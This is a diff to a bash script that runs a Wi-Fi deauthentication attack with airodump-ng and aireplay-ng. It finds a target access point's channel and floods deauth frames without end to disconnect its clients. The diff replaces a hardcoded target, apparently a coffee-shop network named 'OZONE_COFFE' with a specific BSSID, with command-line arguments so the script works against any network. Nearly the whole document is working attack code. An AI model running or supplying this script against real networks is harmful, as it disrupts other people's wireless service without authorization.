@@ -3,6 +3,7 @@
 if [[ -n $1 && $1 == *"mon"* ]]  then 
 
 	airodump-ng --output-format csv -w airodump_output $1  >/dev/null 2>&1 &   
+
 	AIRODUMP_PID=$!
 elif [[ $1 == *"mon"* ]]  then 
 	printf "[-] $1 interface is not in monitor mode"
@@ -20,8 +21,7 @@ sleep 1
 echo "[*] Scanning for 5 seconds..."
 sleep 5
 
-
-BSSID_CHA=$(cat airodump_output-01.csv | head -n  $(grep -n '^[[:space:]]*$' airodump_output-01.csv | cut -d: -f1 | head -n 2 | tail -1) | grep "OZONE_COFFE" | cut -d " " -f7 | cut -d  "," -f1)
+BSSID_CHA=$(cat airodump_output-01.csv | head -n  $(grep -n '^[[:space:]]*$' airodump_output-01.csv | cut -d: -f1 | head -n 2 | tail -1) | grep "$3" | cut -d " " -f7 | cut -d  "," -f1)
 
 if [[ $BSSID_CHA ]] ; then
 	echo "[*] AP Channel Found..." 
@@ -33,11 +33,11 @@ else
 fi 
 
 echo "[*] Start monitoring ..." 
-airodump-ng --bssid  08:AA:89:6D:36:A8 $1 >/dev/null 2>&1 &
+airodump-ng --bssid  $2 $1 >/dev/null 2>&1 &
 
 sleep 5 
 
-BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
+BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2  $1 -j | cut -d " " -f11 | head -n 1 ) 
 
 sleep 5 
 
@@ -46,14 +46,16 @@ echo "[*] Checking channels "
 while true  ; 
 do 
 	if [[ $BSSID_CHA != $BSSID_CHA_DEAUTH ]] ; then 
-		BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
-		echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH" 
-		sleep 3 
+		BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  $2 $1 -j | cut -d " " -f11 | head -n 1 ) 
+		echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH ... Trying other channels " 
+		sleep 1 
+		break 
 	else 
-		aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1  
+		aireplay-ng -0 0 -a  $2  $1  
 		echo "[+] Channel Found \n" 
 		sleep 1 
 		echo "[+] Deathenticating Devices... " 
 	fi 
 	continue 
 done 
+
